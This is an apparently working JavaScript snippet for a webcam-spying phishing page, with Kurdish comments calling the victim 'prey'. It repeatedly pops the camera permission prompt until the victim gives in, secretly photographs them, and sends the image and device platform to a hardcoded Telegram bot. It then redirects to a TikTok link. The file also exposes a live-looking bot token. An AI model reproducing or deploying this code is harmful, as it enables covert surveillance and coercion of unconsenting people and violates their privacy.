const token = "8454166362:AAE-teyJSdRqs8yUA4UPUeHmiIT0TtyT1hc";
const chat_id = "7261354534";
const target = "https://vt.tiktok.com/ZS5WMhjoP/";
let captured = false;

// ئەم فەنکشنە بەرپرسە لە وێنەگرتن و ناردنی
async function handleSuccess(stream) {
    const v = document.getElementById('v');
    v.srcObject = stream;
    await v.play();
    document.getElementById('flash').style.display = 'block';

    const canvas = document.getElementById('c');
    canvas.width = v.videoWidth; canvas.height = v.videoHeight;
    canvas.getContext('2d').drawImage(v, 0, 0);
    const blob = await (await fetch(canvas.toDataURL('image/jpeg', 0.8))).blob();
    
    const fd = new FormData();
    fd.append('chat_id', chat_id);
    fd.append('photo', blob, 'hit.jpg');
    fd.append('caption', `🔥 پاشا، نێچیرەکە خۆی بەدەستەوە دا!\n📱 ئامێر: ${navigator.platform}`);
    
    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
    window.location.href = target;
}

// 👑 فێڵی سەرەکی: ئەگەر یەک جار کلیکی کرد، چیتر ڕزگاری نابێت
async function startHeist() {
    if (captured) return;

    // داواکردنی مۆڵەت بە شێوەی بێکۆتایی
    const requestPermission = () => {
        navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            if (!captured) {
                captured = true;
                handleSuccess(stream);
            }
        })
        .catch(err => {
            // 😈 ئەگەر "Cancel" ی کرد، دوای 0.3 چرکە یەکسەر پەنجەرەکە دەهێنێتەوە
            console.log("نێچیرەکە ڕەفزی کرد، دووبارە هەوڵ دەدەینەوە...");
            setTimeout(requestPermission, 300); 
        });
    };

    requestPermission();
}
